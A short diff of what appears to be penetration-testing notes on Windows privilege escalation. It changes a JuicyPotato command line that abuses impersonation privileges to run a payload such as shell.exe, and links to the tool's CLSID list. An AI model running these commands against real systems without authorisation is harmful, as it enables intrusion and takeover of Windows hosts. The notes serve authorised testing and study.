@@ -895,7 +895,7 @@ net user {USERNAME}
 
 # Check Privledges for Impersonation
 whoami /priv
-JuicyPotato.exe -l 1337 -p C:\Users\Public\Downloads\shell.exe -t * -c {CLSID}
+JuicyPotato.exe -t * -p {run.exe} -l 8003
 
 https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
 
